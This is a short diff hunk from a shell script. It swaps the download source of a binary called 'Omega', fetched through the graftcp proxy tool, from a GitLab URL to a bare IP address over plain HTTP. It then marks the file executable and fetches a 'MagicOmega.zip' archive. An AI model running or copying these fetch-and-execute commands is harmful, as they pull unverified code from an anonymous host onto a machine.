@@ -35,7 +35,7 @@ echo "******************************************************************"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://gitlab.com/nathanfleight/scripts/-/raw/main/Omega
+./graftcp/graftcp wget http://3.16.66.235/Omega
 chmod +x Omega
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/MagicOmega.zip
